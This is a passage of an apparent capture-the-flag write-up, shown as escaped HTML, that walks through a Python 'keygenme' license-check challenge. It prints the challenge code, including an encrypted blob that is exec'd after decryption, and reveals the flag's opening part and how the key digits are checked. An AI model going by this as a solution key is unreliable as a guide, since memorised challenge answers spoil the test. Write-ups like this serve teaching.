&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;keygenme.py&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;w&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;fout:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;full_version
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;full_version_code
&lt;&#x2F;span&gt;&lt;span&gt;          full_version_code &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(full_version)
&lt;&#x2F;span&gt;&lt;span&gt;          fout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(full_version_code&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;arcane_loop_trial
&lt;&#x2F;span&gt;&lt;span&gt;          arcane_loop_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;jump_into_full
&lt;&#x2F;span&gt;&lt;span&gt;          jump_into_full &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Full version written to &amp;#39;keygenme.py&amp;#39;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;                 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Exiting trial version...&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;FileExistsError&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;stderr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Full version of keygenme NOT written to disk, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;                      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ERROR: &amp;#39;keygenme.py&amp;#39; file already exists.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ADVICE: If this existing file is not valid, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;you may try deleting it and entering the &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;license key again. Good luck&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ui_flow&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;intro_trial&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;arcane_loop_trial:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;menu_trial&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Encrypted blob of full version
&lt;&#x2F;span&gt;&lt;span&gt;full_version &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;gAAAAABgT_nvHAwPaWal_64Giubfb7I87ML4ANp4g-eUbMTqsc4asWygnpXcaJ5FLahXXDcul9xPDqIPPytiZ9aMm25S6dgfi4ZPvM5IUSnnNjk6dxYAKsX5Yd72BV4ERrqdNNn2jZrphzlV4a4gY-XV_0ZHovFlHhEpPQnTtG_5RTETId0xAD5K5iActkI9a3P4sx6ExBQ082EuPFlnWtUGl0dsEDHher3xT_lZe9JP5UAcOJsoC9AJ7N3Y1KjWXATzaBkXw6XTnzqDHu9Ycffw-i-GfQP-16hF_f2WBE9nQqniFu6THNuAvqwg0XBnsfvV0Fo3MTpON6HpeI3eIXqd4tLtsfhNcPa99ugrucf0l19Z5eFvrtMMgmfW_9lgvO7UcCft79ShvQWEHjhVeiDKBZo7TgTJ-1wpB92obH_bFGJpMcsp1w42tDEJmavnRSKXl39ph9-cgVXUKTfsjUbJCgtZfR8yj28JFCdmETu2kkt_dW4aLN8BTeRHLUpCEod9xBUFxzQJZNxey6ISn2j-PTR-yxCXrC2_A3TCBcqwUJYviP6emLKPSBRJB8dkRlWmylnMH4aYd6YXPnY457tk6UpGO6Ezw4K4DEhFtMSO4Vq2UhAS85j8kokc9_GG2v315uqVZ-TY7nU7xkhsrtEFK0h-0jiiLbTKLvOb3zpXq0ELdX9_WEK681LsIuFErhsvvPmmXx1K7IDlmjIWkYw--7lqpXPVrl9LalI-7npOF4MYet3jlH9v5Y83K3VDCrNZjH8uqK4pTKo0_I4HOmEtfe8pghAYDldmQ8wvphHRh4UEM34QcgCJa3VH1XAu2MRDwbEWcnXxumt_xL2wXBTFAPZWxrnioRunzw5HnrqW6Nzi871XiJ0OHQzt_ulvgxDmFMxAiSpzm9YJoxspTG1hpSqLe5IUICBXEhofgTAhHePGff-Qi20rDYQMQio8zoyV2ZPRjKVk8YDGZdhuSQaKLx-DRdvKBzmAYqjbvmbC_4Tt3_amXlqxeLRLA9YP7vtxv9Y65WZ-8DeGdZTinUgjh6xqJH0xJvfEhXITOEiFGZseX2kPPG4pX1nDCZ8R9ksgHxkpnW24sQSVGmx5DP0xGihfmABc98bag-qrs-QIb7YqwJqK0-0N0t7hFKF671doX07XWcIGLJuFZ0MHxPOIjVIWN8Xb7mKJiL7goQH8xuy9FcE6w8_GVw5N9nfWUCFdZKENYJ5WY3iX20OtJgiYTwvCTetf-wDWj_FH6z_hpufI1sDh9lO9EnAhxpoNo4jMjC3eZUKPkkUf_gfvjWmnA89Gvsuxj70lzwZ1650isi0_JPtDIWKaksprzIW8YN-MeuBYy_f3JJOtU4cCg5sInTM3YW5GupJMO4h6Y6vk1QPxWYM5Nr5_cB7i2FSyt7DY72L_ede8YNJxcRCBkf3eD-3aO6KmPAbbf_48aaM3L1axNVKwubW9Mec6YRoV0JwgJM0Km3YAGL_ybtYX5JeoPQzoOQBw_Vue2k8PsnbO6n2p3acaY8Y-6ZhKnrSBaeuACSZtTqJT4_WXYslQyX-Pgl-ljcq84H0AAPNnJ9AlNZwvGL6fKbdcxpcQ7RN8fdoU6bJ2q2XecXred2XfE2UHK-QTacm-amF5Mt4WrNlF8RGRuCagny7o6XyEYO_-xyowpUYsOA9c5j6u8qpju0donhdr0OWWKHpIWvOsDdzX-YEcQvfdXfLdDLDSDqGJUyB5giQK3IVqUeBAN2ZHdKyFAACUog4U0RJLJ3tEedF_PLZ5eqHyo_jwfBmqRi_bK2cwuYU_psxTBB6o2a2o1vx-nprP4QFVxdWD7by4VTFKCVW2yAGkL1OHPAc6hcoVhysAIMQhhqJF0SXXdqeXzFrM7pexr3sV9uL_R_CcknOk28VE0IyrvJLMj1sI-MkXqRFTdwjump6fneQizBHAy2Kk7GgU7JLwSvgUVGBS581ITxuQ-jeZW5od1m9z6xYLMKXNSV-EUZXhGPOz4kd87gTRxDMd9S5pkSqfiBQgrIrEuNtaDYJsc22r5MAGNpe-ouGhE_QRMPDaEVP8CibNu0wnjgrt_4Qf8M6ZURy6fzssBsqIjfFymJDe8uSmz5yosvTuRfsjcC_mhyeVFrjiHSzH5OEfNS0ihPMI6H9j4vdid0Wk3ewjfT3rpsadbuHBJTRxPcBN-dc8vaLvLzcJehyGQhvEVwmiycjAJ16pgOT5-rR0-ZLKoiaaa3OHcs8RB3ZXLe9LkJHsqCvjGeI4qqlkLfAhG08gNsAxtcbYAEVzKDvNDPdbWOsioIX3lKKiiGNztZMruThMwycUQ1zRN_5sRC5DTQDv0l3ka0OELW2U04Og5Sj5x1u2rdWSBa9nEI6LJ7nnp-pLTGo-C7tsq1boTz4WdHNMvAP2GWv99NFN37pa8UY6mjmdMAg0Ppw9rfxeGKq60jh-VcBuY3Yvu1g2_Ntv1e8CeK1jNXl06zLGLBO35hLwix4UcQmU_9M0v1QsYfjYBRW5sUnjcB3lGF8KJg6PYGbHcvAEDlqw12ZtITFOaIqhkpvSzbfG1LQF7e_NfhXijgBMhJBug9tTayv0g5U2CPuZ-B4z_SkmEvN_eU5G1rht3Zv0ygTuOXW0Iig0XxFO02QugZSqIRg7fGRj6fxDVWXvQT6k3zXlXxN6LrHYHbcW7Irs0pLxm7pfAPBYlnFwRTHXI4HhnMUsPiK3v0oPU7IB67y4XCUMncMcGstRB4zqnaZI7dR8YPQfAZQ0CUjT5Z_H52Qp9ek5H_G48vb0DFC1qzgpNlfHcXrBLuhf_Gcc_1dzn9E4ZwoiF16aJhHPHSAGhOwclLy7xxy22ZenZVeKXcXrA7jUbPGcS-SWmUjF1IPe_Pkpfcgi5rIaxUhCWX5jK0c_n0_q2UAv9KAKJBaWstjcYBxtuUtHTFJD0ky9VDOqVJx1-V6tD1lNsnF1FfNrfIpB9YkoCxRIXDuBiCSagiwa830S6-1bREZMZug-etzjr1Wf7cO1PTDd61JSM252DWqHVVLQs8yYKmhzsZxfeI_uV5G7Y8fvwIYBB4krFRjpFR4-fGwF4Vma-xZlr6y9ziILNUyqz2u4FBmMjc1V8YgeqqXsLIuSHF6GDhvGXq-mEqLTWnxSAE-G_zeX7qPDAlsSv_dRLByQ0ZekBEQ1YbCpmnbZIPTJ_IyZLX0ZBOz3oc0ju5mFUFAzN8sJlwuZFH2GQeC9T2GJO8lJEhn4NqiudzmXVMerdRaL1C9ZbJfGSEkuEKQL2I2NeW5Nm7d4MStHdtZhO190_lXP2PQ8Tuz5BrPlYKgGf76NZshAU0XKXglyTWQKzONVv6251qh4wpMgWWFm8Va_zGlXNFd8QmQWpbhkWTLmo9ixI4W92hkw4oheJVE5n9LB1HWz50oSajV_2jJW_5Bd5Gtz6S3Q2X_xfA_TgRyeT0DXgbQ8mYx_N_43S_D94ud66-NnRA_A1KG-uu31KH5btUg6f3-oxoO4waPW8-hM0arNlGjREg0_LhAMALknhfJlno2VnQo2ExgXj6v-kaBlTuh4jt5vbhepD5EgtGvbXT4mypQbS49LA3SxCxEq7vDSxHfnLKWI84IlAeU8NQE6drQd9IGQ9lRWZDzHgvz7dO6Og4pIt7Q6UA2NEIc6ZNDTsghtKFVep19d7nGJDt-4-UCFJSHWBhTKeqb_A34XO4T5U7x-CXqphsBwIdMoPXHrWxhoFYaP6lPJVOryz8TEYDLsHbVdmhYJtA0bPgMPC1rNI-SqcyUqvZFGpIJwDcGghTTS1u8XjMlRkxOxuEMDO364AdLtruslkXjpd2NuUBUFwNWbQbfYIC5mePqxc_PhcaVxMXHYrFh2CLqXX7UhcZxHT9C8RQ==
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Enter main loop
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ui_flow&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;jump_into_full:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exec&lt;&#x2F;span&gt;&lt;span&gt;(full_version_code)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;By looking at the challenge code. The first part of the flag is present in the code as plaintext. &lt;code&gt;key_part_static1_trial = &quot;VishwaCTF{m4k3_it_possibl3_&quot;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The remaining part of the flag is stored in &lt;code&gt;key_part_dynamic1_trial&lt;&#x2F;code&gt;. The full version of the flag is in &lt;code&gt;key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial&lt;&#x2F;code&gt;. We have the full version and the initial part of the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Lets look at the decryption function. This is going to print the decrypted full version if we enter the license which is the middle part of the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Okay, lets see how the key&#x2F;license has been validated here.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_key&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;username_trial&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;key_full_template_trial
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(key) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(key_full_template_trial):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check static base key part --v
&lt;&#x2F;span&gt;&lt;span&gt;        i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;c:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# TODO : test performance on toolbox container
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check dynamic part --v
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;]:
